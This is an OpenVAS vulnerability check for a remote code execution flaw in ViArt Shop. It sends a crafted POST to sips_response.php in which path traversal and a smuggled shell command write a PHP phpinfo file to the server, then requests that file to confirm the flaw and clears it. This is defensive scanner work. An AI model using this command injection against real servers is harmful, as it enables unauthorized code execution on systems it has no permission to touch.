###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_viart_shop_rce_2012_09.nasl 13994 2019-03-05 12:23:37Z cfischer $
#
# ViArt Shop Remote Code Execution Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:viart:viart_shop";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103578");
  script_version("$Revision: 13994 $");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_name("ViArt Shop Remote Code Execution Vulnerability");

  script_xref(name:"URL", value:"http://www.viart.com/downloads/sips_response.zip");
  script_xref(name:"URL", value:"http://www.zeroscience.mk/en/vulnerabilities/ZSL-2012-5109.php");

  script_tag(name:"last_modification", value:"$Date: 2019-03-05 13:23:37 +0100 (Tue, 05 Mar 2019) $");
  script_tag(name:"creation_date", value:"2012-09-26 10:51:47 +0200 (Wed, 26 Sep 2012)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_tag(name:"solution_type", value:"VendorFix");
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_dependencies("gb_viart_shop_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("viart_shop/installed");

  script_tag(name:"solution", value:"Updates are available. Please see the references for more information.");

  script_tag(name:"summary", value:"ViArt Shop is prone to a remote code-execution vulnerability.");

  script_tag(name:"insight", value:"Input passed to the 'DATA' POST parameter in 'sips_response.php'
  is not properly sanitised before being used to process product payment
  data. This can be exploited to execute arbitrary commands via specially crafted requests.");

  script_tag(name:"affected", value:"Affected version: 4.1, 4.0.8, 4.0.5");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if(!port = get_app_port(cpe:CPE))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

function exploit(ex, file) {

  url = dir + '/payments/sips_response.php';
  len = strlen(ex);

  host = http_host_name(port:port);

  req = string("POST ", url, " HTTP/1.1\r\n",
               "Host: ", host, "\r\n",
               "Content-Type: application/x-www-form-urlencoded\r\n",
               "Content-Length: ",len,"\r\n",
               "\r\n",
               ex);
  result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

  url = dir + '/payments/' + file;
  req = http_get(item:url, port:port);
  buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

  if("<title>phpinfo()" >< buf) {
    ex = "DATA=..%2F..%2F..%2F..%2F..%2F;echo '' > ./" + file; # clean up...
    exploit(ex:ex);
    security_message(port:port);
    exit(0);
  }
}

vtstrings = get_vt_strings();
file = vtstrings["lowercase_rand"] + ".php";
ex = "DATA=..%2F..%2F..%2F..%2F..%2F;echo '<?php phpinfo(); ?>' > ./" + file;

exploit(ex:ex, file:file);

exit(0);